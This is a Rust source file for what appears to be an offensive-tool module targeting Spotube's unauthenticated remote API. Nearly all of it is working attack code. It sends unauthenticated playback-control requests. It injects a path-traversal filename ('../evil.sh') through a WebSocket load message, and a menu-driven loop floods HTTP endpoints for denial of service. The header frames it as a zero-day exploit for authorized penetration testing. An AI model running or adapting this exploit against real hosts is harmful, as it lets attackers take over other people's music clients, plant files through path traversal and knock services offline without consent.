//! Spotube Remote API Exploit
//!
//! This module exploits unauthenticated access to the Spotube API, enabling
//! path traversal via WebSocket and denial of service attacks.
//!
//! ## Vulnerability Details
//! - **Affected**: Spotube (desktop music client)
//! - **Attack Vector**: Network (HTTP/WebSocket)
//! - **Impact**: Path traversal, DoS, unauthorized playback control
//!
//! ## Features
//! - Ping server connectivity test
//! - Playback control (next, previous, toggle)
//! - Path traversal injection via WebSocket
//! - HTTP endpoint flooding (DoS)
//!
//! ## Security Notes
//! - Uses utils.rs for target validation
//! - Proper error handling and timeouts
//!
//! Made by Suicidal Teddy - first ever zero day exploit
//! For authorized penetration testing only.

use anyhow::{Context, Result};
use colored::*;
use futures_util::{SinkExt, StreamExt};
use reqwest::Client;
use serde_json::json;
use std::collections::HashMap;
use tokio::time::{sleep, Duration};
use tokio_tungstenite::connect_async;
use tokio_tungstenite::tungstenite::Message;

use crate::utils::{
    normalize_target, prompt_default, prompt_int_range,
};

/// Display module banner
fn display_banner() {
    println!("{}", "‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó".cyan());
    println!("{}", "‚ïë   Spotube Remote API Exploit                              ‚ïë".cyan());
    println!("{}", "‚ïë   Path Traversal + DoS + Playback Control                 ‚ïë".cyan());
    println!("{}", "‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù".cyan());
}

/// Custom headers to emulate browser requests
fn browser_headers(host: &str, port: u16) -> HashMap<String, String> {
    let mut headers = HashMap::new();
    headers.insert("Accept-Language".into(), "en-US,en;q=0.9".into());
    headers.insert("Upgrade-Insecure-Requests".into(), "1".into());
    headers.insert(
        "User-Agent".into(),
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 \
         (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
            .into(),
    );
    headers.insert(
        "Accept".into(),
        "text/html,application/xhtml+xml,application/xml;q=0.9,\
        image/avif,image/webp,image/apng,*/*;q=0.8,\
        application/signed-exchange;v=b3;q=0.7"
            .into(),
    );
    headers.insert("Accept-Encoding".into(), "gzip, deflate, br".into());
    headers.insert("Connection".into(), "keep-alive".into());
    headers.insert("Host".into(), format!("{}:{}", host, port));
    headers
}

/// Sends the GET request to the Spotube endpoint with custom headers
async fn execute(host: &str, port: u16, path: &str) -> Result<()> {
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(std::time::Duration::from_secs(5))
        .build()
        .context("Failed to build HTTP client")?;

    let url = format!("http://{}:{}{}", host, port, path);
    let headers = browser_headers(host, port);

    let mut request = client.get(&url);
    for (key, value) in headers {
        request = request.header(&key, &value);
    }

    let response = request.send().await.context("Request failed")?;
    let status = response.status();
    let body = match response.text().await {
        Ok(t) => t,
        Err(_) => String::new(),
    };

    println!(
        "{} ‚Üí {} {}",
        path,
        status.as_u16(),
        status.canonical_reason().unwrap_or("Unknown")
    );
    println!("{}", body.trim());

    Ok(())
}

/// Sends a malicious 'load' event over WS with a track name containing ../
async fn ws_inject_path_traversal(host: &str, port: u16) -> Result<()> {
    // Prompt for malicious filename using shared utilities
    let malicious_name = prompt_default("Malicious filename", "../evil.sh")?;
    let track_id = prompt_default("Fake track ID", "INJECT1")?;
    let codec = prompt_default("Codec extension", "mp3")?;

    let payload = json!({
        "type": "load",
        "data": {
            "tracks": [
                {
                    "name": malicious_name,
                    "artists": { "asString": "" },
                    "sourceInfo": { "id": track_id },
                    "codec": { "name": codec }
                }
            ]
        }
    });

    let ws_url = format!("ws://{}:{}/ws", host, port);
    println!("Connecting to {} ‚Ä¶", ws_url);

    let (ws_stream, _) = connect_async(&ws_url)
        .await
        .context("WebSocket connection failed")?;
    let (mut write, _) = ws_stream.split();

    let msg_text = payload.to_string();
    write
        .send(Message::Text(msg_text.clone().into()))
        .await
        .context("Failed to send WebSocket message")?;

    println!("‚ñ∂Ô∏è  Malicious load payload sent:");
    println!("{}", serde_json::to_string_pretty(&payload)?);

    Ok(())
}

/// Floods the given endpoint with `count` rapid requests (with optional delay)
async fn dos_flood(host: &str, port: u16, path: &str, count: usize, delay: f64) -> Result<()> {
    println!("‚ö†Ô∏è  Flooding {} {} times (delay {}s)‚Ä¶", path, count, delay);
    for _ in 0..count {
        let _ = execute(host, port, path).await;
        if delay > 0.0 {
            sleep(Duration::from_secs_f64(delay)).await;
        }
    }
    println!("üî•  Done flood.");
    Ok(())
}

/// Parse and validate target using utils.rs normalize_target
async fn parse_target(target: &str) -> Result<(String, u16)> {
    // Use utils.rs normalize_target for comprehensive validation
    let normalized = normalize_target(target)?;
    
    // Check if normalized result contains a port
    if normalized.starts_with('[') {
        // IPv6 format: [::1]:port or [::1]
        if let Some(bracket_end) = normalized.find(']') {
            let host = normalized[1..bracket_end].to_string();
            let rest = &normalized[bracket_end + 1..];
            if rest.starts_with(':') {
                let port = rest[1..].parse::<u16>()
                    .context("Invalid port number")?;
                return Ok((host, port));
            } else {
                // No port provided, prompt for it
                let port = prompt_int_range("Target port", 17086, 1, 65535)? as u16;
                return Ok((host, port));
            }
        }
        anyhow::bail!("Invalid IPv6 format");
    }
    
    // IPv4 or hostname format: host:port or host
    if let Some(colon_pos) = normalized.rfind(':') {
        let host = normalized[..colon_pos].to_string();
        let port = normalized[colon_pos + 1..].parse::<u16>()
            .context("Invalid port number")?;
        Ok((host, port))
    } else {
        // No port provided, prompt for it
        let port = prompt_int_range("Target port", 17086, 1, 65535)? as u16;
        Ok((normalized, port))
    }
}

/// CLI menu for Spotube exploitation
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).yellow());
    println!();
    
    // Parse and validate target
    let (host, port) = parse_target(target).await?;
    println!("{}", format!("[*] Attacking {}:{}", host, port).cyan());
    println!();

    loop {
        println!("\n=== Menu ===");
        println!("1. Ping server");
        println!("2. Next track");
        println!("3. Previous track");
        println!("4. Toggle play/pause");
        println!("5. Inject path-traversal via WS");
        println!("6. Flood HTTP endpoint (DoS)");
        println!("7. Exit");

        let choice = prompt_int_range("Choose an option", 1, 1, 7)? as u8;
        
        match choice {
            1 => {
                println!("\n‚ñ∂Ô∏è  Ping server ‚Ä¶");
                let _ = execute(&host, port, "/ping").await;
            }
            2 => {
                println!("\n‚ñ∂Ô∏è  Next track ‚Ä¶");
                let _ = execute(&host, port, "/playback/next").await;
            }
            3 => {
                println!("\n‚ñ∂Ô∏è  Previous track ‚Ä¶");
                let _ = execute(&host, port, "/playback/previous").await;
            }
            4 => {
                println!("\n‚ñ∂Ô∏è  Toggle play/pause ‚Ä¶");
                let _ = execute(&host, port, "/playback/toggle-playback").await;
            }
            5 => {
                ws_inject_path_traversal(&host, port).await?;
            }
            6 => {
                // Flood prompts using shared utilities
                let path = prompt_default("Endpoint to flood", "/playback/next")?;
                let count = prompt_int_range("Number of requests", 100, 1, 10000)? as usize;
                let delay = prompt_int_range("Delay between requests (ms)", 0, 0, 10000)? as f64 / 1000.0;

                dos_flood(&host, port, &path, count, delay).await?;
            }
            7 => {
                println!("üëã  Goodbye!");
                break;
            }
            _ => println!("‚ùå  Invalid choice, try again."),
        }
    }

    Ok(())
}

